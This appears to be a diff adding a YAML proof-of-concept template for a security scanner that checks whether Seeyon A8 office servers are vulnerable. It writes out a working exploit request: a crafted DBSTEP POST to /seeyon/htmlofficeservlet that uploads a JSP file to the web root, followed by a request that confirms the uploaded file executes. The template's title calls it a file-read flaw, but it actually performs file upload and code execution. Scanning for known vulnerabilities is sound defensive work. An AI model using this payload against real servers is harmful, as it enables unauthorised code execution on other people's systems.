@@ -1,0 +1,45 @@
+id: poc-yaml-seeyon-a8-rce
+info:
+  name: Seeyon A8 任意文件读取漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: Seeyon
+  osprey-id: vb_2019_0038
+requests:
+- method: GET
+  path: /seeyon/htmlofficeservlet
+  expression: 'status_code == 200 && contains(body, "htmoffice")
+
+    '
+- method: POST
+  path: /seeyon/htmlofficeservlet
+  headers: {}
+  data: 'DBSTEP V3.0     359             0               120             DBSTEP=OKMLlKlV
+
+    OPTION=S3WYOSWLBSGr
+
+    currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
+
+    CREATEDATE=wUghPB3szB3Xwg66
+
+    RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
+
+    originalFileId=wV66
+
+    originalCreateDate=wUghPB3szB3Xwg66
+
+    FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdNHlZcQD3yaz3aioXwUo5nHzs
+
+    needReadFile=yRWZdAS6
+
+    originalCreateDate=wLSGP4oEzLKAz4=iz=66
+
+    <%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%
+    out.println("ok11111112212354659f"); %>'
+  expression: contains(body, "CLIENTIP=")
+- method: GET
+  path: /seeyon/vuln_test_2222.jsp
+  expression: contains(body, "ok11111112212354659f")
+variables: {}
+transport: http
